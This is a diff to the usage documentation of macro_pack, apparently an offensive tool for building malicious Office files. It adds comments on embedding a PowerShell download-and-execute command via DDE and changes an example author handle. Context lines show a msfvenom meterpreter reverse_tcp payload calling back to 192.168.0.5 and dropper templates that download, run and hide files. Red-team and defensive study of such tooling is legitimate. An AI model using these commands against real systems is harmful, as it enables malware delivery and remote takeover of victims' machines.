@@ -123,6 +123,8 @@ echo calc.exe | macro_pack.exe --dde -W dde_test.docx
 
 - Download and execute file via powershell using Dynamic Data Exchange (DDE) attack
 ```bash
+# 1 Change the target file URL in resources\community\ps_dl_exec.cmd
+# 2 Embed download execute cmd in document
 python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -w DDE.doc
 ```
 
@@ -161,7 +163,7 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macr
     -t, --template=TEMPLATE_NAME 
         Available templates:
         	HELLO   -> Just print a hello message and awareness about macro
-                    -> Example use: echo "@EmericNasi" | %s -t HELLO -P hello.pptm
+                    -> Example use: echo "@Author" | %s -t HELLO -P hello.pptm
             DROPPER -> Download and exec file
                     -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -x dropper.xls
             DROPPER2 -> Download and exec file. File attributes are also set to system, readonly, and hidden
